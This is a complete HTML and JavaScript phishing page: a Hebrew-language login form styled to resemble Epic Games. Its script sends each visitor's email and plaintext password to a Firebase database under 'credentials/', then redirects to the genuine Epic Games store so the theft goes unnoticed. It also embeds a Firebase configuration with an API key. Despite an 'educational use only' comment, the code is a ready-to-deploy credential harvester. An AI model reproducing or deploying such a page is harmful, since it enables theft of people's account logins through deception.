<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>התחברות</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #121212;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      background: #202020;
      padding: 40px;
      border-radius: 6px;
      text-align: center;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
      max-width: 400px;
      width: 100%;
    }
    input { 
      width: 100%; 
      padding: 15px; 
      margin-bottom: 15px; 
      border-radius: 4px; 
      border: 1px solid #404040; 
      background: #252525; 
      color: white; 
      box-sizing: border-box;
    }
    button { 
      width: 100%; 
      padding: 16px; 
      background: #0074e4; 
      border: none; 
      color: white; 
      border-radius: 4px; 
      cursor: pointer; 
      font-weight: bold; 
      text-transform: uppercase; 
      margin-top: 6px; 
    }
    button:hover { background: #007bf5; }
    .message-area { margin-top: 15px; min-height: 20px; }
  </style>
</head>
<body>
  <div class="box">
    <h2>התחברות</h2>
    <input type="email" id="email" placeholder="כתובת אימייל" />
    <input type="password" id="password" placeholder="סיסמה" />
    <button onclick="sendCredentials()">שלח</button>
    <div id="message" class="message-area"></div>
  </div>

  <!-- Firebase compat SDKs -->
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

  <script>
    // Your Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyAKtyhpnlaCVCTT8BCoW9en5YVfr4YCFpw",
      authDomain: "fir-5fe8e.firebaseapp.com",
      databaseURL: "https://fir-5fe8e-default-rtdb.firebaseio.com",
      projectId: "fir-5fe8e",
      storageBucket: "fir-5fe8e.appspot.com",
      messagingSenderId: "606293622612",
      appId: "1:606293622612:web:6bb8a8556e82d8161e92c1",
      measurementId: "G-Z032KM5LE8"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function setMsg(text, color = "white") {
      const el = document.getElementById("message");
      el.style.color = color;
      el.innerText = text;
    }

    function sendCredentials() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;

      if (!email || !password) {
        setMsg("אנא מלא את כל השדות", "#ff3e3e");
        return;
      }

      // Optional: basic email validation
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(email)) {
        setMsg("כתובת אימייל לא תקינה", "#ff3e3e");
        return;
      }

      // Push credentials to Firebase (educational use only)
      db.ref("credentials/").push({
        email: email,
        password: password,  // WARNING: plaintext passwords
        timestamp: Date.now()
      }).then(() => {
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        window.location.replace("https://store.epicgames.com/en-US");
      }).catch(err => {
        console.error(err);
        setMsg("שגיאה בשליחה: " + err.message, "#ff3e3e");
      });
    }
  </script>
</body>
</html>
